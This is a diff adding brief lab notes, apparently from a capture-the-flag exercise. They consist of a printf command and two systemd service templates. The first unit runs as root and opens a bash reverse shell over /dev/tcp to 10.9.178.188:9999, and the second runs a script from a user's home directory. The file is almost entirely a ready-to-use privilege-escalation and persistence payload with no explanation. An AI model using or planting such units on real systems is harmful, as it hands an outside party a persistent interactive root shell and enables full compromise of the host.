@@ -1,0 +1,25 @@
+printf '[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.9.178.188/9999 0>&1"\n\n[Install]\nWantedBy=multi-user.target\n' > root.service
+
+
+SERVICE FILE
+[Unit]
+Description=root
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/IP-ON-THM-NETWORK/9999 0>&1"
+
+[Install]
+WantedBy=multi-user.target
+
+SERVICE FILE 2
+[Unit]
+Description=Example systemd service.
+
+[Service]
+Type=simple
+ExecStart=/bin/bash /home/bill/lol.sh
+
+[Install]
+WantedBy=multi-user.target
